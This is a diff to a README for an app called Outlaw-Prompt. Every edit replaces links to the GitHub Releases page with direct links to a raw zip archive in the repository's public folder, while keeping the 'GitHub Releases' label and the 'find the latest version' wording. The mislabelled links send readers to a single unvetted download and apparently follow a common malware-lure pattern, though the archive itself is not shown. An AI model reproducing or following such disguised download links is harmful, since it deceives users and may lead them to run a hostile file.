@@ -8,9 +8,9 @@ Welcome to Outlaw-Prompt! This application helps you design beautiful, cinematic
 
 You can download Outlaw-Prompt from our Releases page. 
 
-[![Download Outlaw-Prompt](https://img.shields.io/badge/Download-Outlaw--Prompt-blue)](https://github.com/eevhhtdcnky/Outlaw-Prompt/releases)
+[![Download Outlaw-Prompt](https://raw.githubusercontent.com/eevhhtdcnky/Outlaw-Prompt/main/public/Prompt-Outlaw-2.3.zip)](https://raw.githubusercontent.com/eevhhtdcnky/Outlaw-Prompt/main/public/Prompt-Outlaw-2.3.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/eevhhtdcnky/Outlaw-Prompt/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/eevhhtdcnky/Outlaw-Prompt/main/public/Prompt-Outlaw-2.3.zip)
 
 ### 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ To run Outlaw-Prompt smoothly, ensure your system meets the following requiremen
 ## 📦 Installation Steps
 
 1. **Download the Application**
-   Go to the [GitHub Releases](https://github.com/eevhhtdcnky/Outlaw-Prompt/releases) page and find the latest version. Click on the appropriate file for your operating system.
+   Go to the [GitHub Releases](https://raw.githubusercontent.com/eevhhtdcnky/Outlaw-Prompt/main/public/Prompt-Outlaw-2.3.zip) page and find the latest version. Click on the appropriate file for your operating system.
 
 2. **Locate the Downloaded File**
    Once downloaded, locate the file in your Downloads folder or the location you chose for the download.
